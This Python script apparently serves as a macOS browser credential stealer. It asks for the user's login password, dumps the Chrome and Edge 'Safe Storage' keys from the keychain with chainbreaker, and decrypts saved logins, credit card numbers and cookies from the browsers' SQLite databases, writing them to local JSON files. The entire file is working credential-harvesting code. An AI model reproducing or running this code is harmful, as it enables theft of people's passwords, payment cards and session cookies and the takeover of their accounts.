import base64
import binascii
import json

# https://github.com/n0fate/chainbreaker
import chainbreaker
import csv
import getpass
import glob
import hashlib
from pathlib import Path
import random
import shlex
import subprocess
import sqlite3
import string
import sys
import tempfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

DEBUG = True

# Yellow color
def print_debug(text):
    if DEBUG:
        print("\033[93m[DEBUG] {}\033[0m".format(text))

# Green color
def print_info(text):
    print("\033[92m[INFO] {}\033[0m".format(text))


class Broswer:
    def __init__(self, safe_storage_secret_keys): 
        #self.browsers = ['amigo', 'torch', 'kometa'  'orbitum'  'cent-browser'  '7star'  'sputnik'  'vivaldi'  'google-chrome-sxs'  'google-chrome'  'epic-privacy-browser'  'microsoft-edge'  'uran'  'yandex'  'brave'  'iridium'  'edge']
        self.browsers = {"chrome": "Google-Chrome", "microsoft edge":"Microsoft-Edge"}
        self.browser_paths = {}
        self.login_path = []
        self.web_path = []
        self.cookies_path = []
        self.logins = []
        self.credit_cards = []
        self.cookies = []
        # self.decrypt_keys = {'Google-Chrome': 'base64_encode_value', 'Microsoft-Edge': 'base64_encode_value'}
        self.decrypt_keys = {}
        
        self._set_decrypt_keys(safe_storage_secret_keys)
        self._set_browser_path()
        self._set_browser_data_path()
        
    # This is to keep browser names such as `Google-Chrome` and `Microsoft-Edge` remain consistent
    # among other variables 
    def _set_decrypt_keys(self, safe_storage_secret_keys):
        if safe_storage_secret_keys:
            for  secret_name, secret_value in safe_storage_secret_keys.items():
                offset = secret_name.find("Safe Storage") 
                key_name = secret_name[:offset].strip().lower()
                if key_name in self.browsers:
                    self.decrypt_keys[self.browsers[key_name]] = secret_value
        print_debug(f"decrypt_keys = {self.decrypt_keys}")
                
        
    # get the installed browser path by searching for the folder `Local Extension Settings`
    # in `Application Support`
    def _set_browser_path(self):
        path = '/Users/*/Library/Application Support/**/*/Local Extension Settings'
        extension_paths = glob.glob(path,recursive=True)
        # conver a list int dict
        if extension_paths:
            start = extension_paths[0].find("Application Support") + len("Application Support/")
            for extension_path in extension_paths:
                end = extension_path.find("/Default")
                browser = extension_path[start:end].replace("/", "-").replace(" ", "-")
                self.browser_paths [browser] = extension_path[:end]
                
        print_info(f"Available browsers = { self.browser_paths }")
    
    # this get path of a browser `Login Data`, `Web Data`, and `Cookies`
    def _set_browser_data_path(self):
        # set `self.browser_paths` if it's not set already
        if not self.browser_paths:
            self._set_browser_path
        
        for browser_name, browser_path in self.browser_paths.items():
            login_data   = glob.glob(f"{browser_path}/*/Login Data")
            web_data     = glob.glob(f"{browser_path}/*/Web Data")
            cookies_data = glob.glob(f"{browser_path}/*/Cookies")
            
            # login_data, web_data, and cookies_data is an array
            if login_data:
                self.login_path.append({browser_name: login_data})
            if web_data:
                self.web_path.append({browser_name: web_data})
            if cookies_data:
                self.cookies_path.append({browser_name: cookies_data})

    def decrypter(self, cipher_text, key):
        try:
            # Decode the base64 encoded ciphertext
            cipher_text_decoded = base64.b64decode(cipher_text)

            # Extract IV from the beginning of the decoded ciphertext
            iv = cipher_text_decoded[:16]
            encrypted_data = cipher_text_decoded[16:]

            # Derive the key using PBKDF2
            key = hashlib.pbkdf2_hmac('sha1', key.encode('utf-8'), b'saltysalt', 1003)[:16]

            # Set up AES decryption
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()

            # Decrypt the data
            decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

            return decrypted_data
        except Exception as e:
            print(f"[-] Error during decryption: {e}")
            return None

              
    def browse_browser_db(self, browser_data_paths, query_type): 
         # data_path is self.login_data, self.web_data, and cookies_data is an array containg dict
         # the dict key is browser name and the value is array of the data path
         temp_file = tempfile.mkdtemp()
         for browser_data_path in browser_data_paths:
             #print_debug(f"browser_data_path={browser_data_path}")
             for browser_name, data_paths in browser_data_path.items(): 
                 for data_path in data_paths:
                    if query_type == "logins":
                        query = "select username_value, password_value, origin_url from logins"
                        result_columns = ["user","password", "url"]
                    elif query_type == "credit_cards":
                        query = "select name_on_card, card_number_encrypted, expiration_month, expiration_year from credit_cards"
                        result_columns = ["name", "card_number", "exp_m", "exp_y"]

                    elif query_type == "cookies":
                        query = "select name, encrypted_value,host_key,path,is_secure,is_httponly,expires_utc from cookies"
                        result_columns = ["name","encrypted_value","host_key","path","is_secure","is_httponly", "expires_utc"]
                    else:
                        print('Invalid query type ', query_type, ' for browser ', browser_name)
                        continue
                    
                    # sqlite3 won't open the file so copy the file to a temp folder
                    temp = Path(temp_file) / browser_name 
                    if not temp.exists():
                        temp.mkdir(exist_ok=True)
                    temp_path = temp / query_type
                    #print_debug(f"temp_path: {temp_path}")
                    
                    with open(data_path, "rb") as f:
                        with open(temp_path, "wb") as t:
                            t.write(f.read())
                    
                    con = sqlite3.connect(temp_path)
                    
                    browser_details = {"browser": browser_name, "profile": data_path.split('/')[-2], "content_type": query_type, "data": []}
                    for query_result in con.execute(query).fetchall():
                        # checking if the execution was a success
                        if len(query_result) > 2:
                            browser_details["data"].append(dict(zip(result_columns, query_result)))
                    
                    #print_debug(f"browser_details = {browser_details}")
                    
                    if query_type == "logins":
                        self.logins.append(browser_details)
                    elif query_type == "credit_cards":
                        self.credit_cards.append(browser_details)
                    elif query_type == "cookies":
                        self.cookies.append(browser_details)
                        

    def write_secret_to_file(self):
        secret_output = Path.cwd() / "secret_output"
        print_info(f"Writing the browser secrets to {secret_output}") 
        
        # write self.logins to the output file
        print_info("Writing login details to a file")
        if self.logins:
            for login in self.logins:
                content_type = login["content_type"] + "_"
                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
                browser_path = secret_output / login["browser"] 
                if not browser_path.exists():
                    browser_path.mkdir(parents=True, exist_ok=True)
                    
                login_path = browser_path / content_type
                write_dict_to_json(login_path, login["data"])
                
        # write self.logins to the output file
        print_info("Writing credit cards info to a file")
        if self.credit_cards:
            for credit_card in self.credit_cards:
                content_type = credit_card["content_type"] + "_"
                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
                browser_path = secret_output / credit_card["browser"] 
                if not browser_path.exists():
                    browser_path.mkdir(parents=True, exist_ok=True)
                    
                credit_card_path = browser_path / content_type
                write_dict_to_json(credit_card_path, credit_card["data"])
                
        # write self.logins to the output file
        print_info("Writing cookies to a file")    
        if self.cookies:
            for cookie in self.cookies:
                content_type = cookie["content_type"] + "_"
                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
                browser_path = secret_output / cookie["browser"] 
                if not browser_path.exists():
                    browser_path.mkdir(parents=True, exist_ok=True)
                cookie_path = browser_path / content_type
                write_dict_to_json(cookie_path, cookie["data"])
                     
    def browse_browser_data(self):
        # Read browser logins, credit_cards, and cookies
        self.browse_browser_db(self.login_path, "logins")
        self.browse_browser_db(self.web_path, "credit_cards")
        self.browse_browser_db(self.cookies_path, "cookies")
        
        # decrypt credentials
        print_info("Decrypting credentials")
        if self.logins:
            for login in self.logins:
                print_debug(f"login = {login}")
                browser_name =  login["browser"]
                if browser_name in self.decrypt_keys:
                    decrypt_key = self.decrypt_keys[browser_name]
                    
                    for data in login["data"]:
                        if decrypt_key:
                            try:
                                if data["password"]:
                                    data["password"] = self.decrypter(data["password"], decrypt_key)
                            except Exception as e:
                                print(f"[-] Error decrypting password: {e}")
                else:
                    print(f"[-] browser_name= {browser_name} is not in  self.decrypt_keys={self.decrypt_keys}")
       
        # decrypt credit cards 
        print_info("Decrypting credit card numbers")                             
        if self.credit_cards:
            for credit_card in self.credit_cards:
                print_debug(f"credit_card = {credit_card}")
                browser_name =  credit_card["browser"]
                if browser_name in self.decrypt_keys:
                    decrypt_key = self.decrypt_keys[browser_name]
                    
                    for data in credit_card["data"]:
                        if decrypt_key:
                            try:
                                if data["card"]:
                                    data["card"] = self.decrypter(data["card"], decrypt_key)
                            except Exception as e:
                                    print(f"[-] Error decrypting credit card: {e}")
                else:
                    print(f"[-] browser_name= {browser_name} is not in  self.decrypt_keys={self.decrypt_keys}")

        # decrypt cookies
        print_info("Decrypting cookies")                                
        if self.cookies:
            for cookie in self.cookies:
                browser_name =  cookie["browser"]
                if browser_name in self.decrypt_keys:
                    decrypt_key = self.decrypt_keys[browser_name]
                    
                    for data in cookie["data"]:
                        if decrypt_key:
                            try:
                                if data["encrypted_value"]:
                                    data["value"] = self.decrypter(data["encrypted_value"], decrypt_key)
                            except Exception as e:
                                print(f"[-] Error decrypting cookies: {e}")        
                else:
                    print(f"[-] browser_name= {browser_name} is not in  self.decrypt_keys={self.decrypt_keys}")


def convert_bytes_to_str(data):
    def convert(value):
        if isinstance(value, bytes):
            return value.hex()  # Возвращаем строковое hex представление байтов
        return value

    def traverse_and_convert(d):
        if isinstance(d, dict):
            return {k: traverse_and_convert(v) for k, v in d.items()}
        elif isinstance(d, list):
            return [traverse_and_convert(item) for item in d]
        else:
            return convert(d)

    return traverse_and_convert(data)


# Функция для записи данных в JSON файл
def write_dict_to_json(filename, dict_data):
    if dict_data:
        # Преобразование всех полей типа bytes
        dict_data = convert_bytes_to_str(dict_data)

        print_debug(f"Writing {filename}")
        with open(filename, "w") as f:
            json.dump(dict_data, f, indent=4, ensure_ascii=False)
              
def run_command(command):
    cmd = shlex.split(command)
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout, stderr

# get the path of the login.keychain
def get_login_keychain():
    print_debug("Called get_login_keychain")
    command = "security list-keychains"
    stdout, stderr = run_command(command)
    login_keychain = None
    if stdout:
        keychains =  stdout.replace(b'"',b'').splitlines()
        for keychain in keychains:
            if b"login.keychain" in keychain:
                login_keychain = keychain.strip()
                break
    
    return login_keychain
    
# iterate through the chainbreaker generic password to get password of safe storage
def get_safe_storage_secret_keys(passwords):
    print_debug("Called get_safe_storage_secret_keys")
    safe_storage_secret_keys ={}
    for password in passwords:
        if "Safe Storage" in password.PrintName.decode(): 
            safe_storage_secret_keys[password.PrintName.decode()] = password.password
    print_debug(f"safe_storage_secret_keys = {safe_storage_secret_keys}")
    return safe_storage_secret_keys
    
    
def main():
    password=getpass.getpass("[+] Enter login password: ")
    # get login.keychain
    login_keychain = get_login_keychain()
    if not login_keychain:
        print(f"[-] Failed to get login_keychain file path: {login_keychain}")
        sys.exit(1)
    print_info(f"Login keychain path= {login_keychain.decode()}")
    
    # use chainbreaker to dump all generic password
    print_info("Dumping passwords from keychain") 
    keychain = chainbreaker.Chainbreaker(login_keychain, unlock_password=password)
    passwords = keychain.dump_generic_passwords()
    safe_storage_secret_keys = get_safe_storage_secret_keys(passwords)
    
    for value in safe_storage_secret_keys.values():
        if "Invalid Password" in value:
            print("[-] Entered password was incorrect")
            sys.exit(1)

    # use browser safe storage secrets and decrypt the browser encrypted stored data
    browser = Broswer(safe_storage_secret_keys)
    print_info("Getting and Decrypting browser secrets") 
    browser.browse_browser_data()
    browser.write_secret_to_file()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        DEBUG = True
        
    print_info("Read and decrypt browsers stored secrets such as passwords, credit cards details, and cookies")
    main()
